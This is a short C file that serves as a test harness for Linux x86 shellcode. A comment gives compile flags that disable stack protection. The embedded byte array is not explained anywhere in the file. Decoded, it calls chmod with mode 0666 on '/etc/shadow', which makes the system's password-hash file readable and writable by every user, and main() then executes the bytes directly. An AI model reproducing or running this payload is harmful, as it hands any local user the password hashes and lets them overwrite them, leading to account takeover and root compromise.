/*
/ Shellcode stub - just for testing the generated shellcode and give it a runtime frame
/ compile with: gcc -z execstack -fno-stack-protector -D_FORTIFY_SOURCE shellcode.c -o shellcode -g -ggdb
/
*/

unsigned char code[] = \
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";

main()
{
	int (*ret)() = (int(*)())code;
	ret();
}
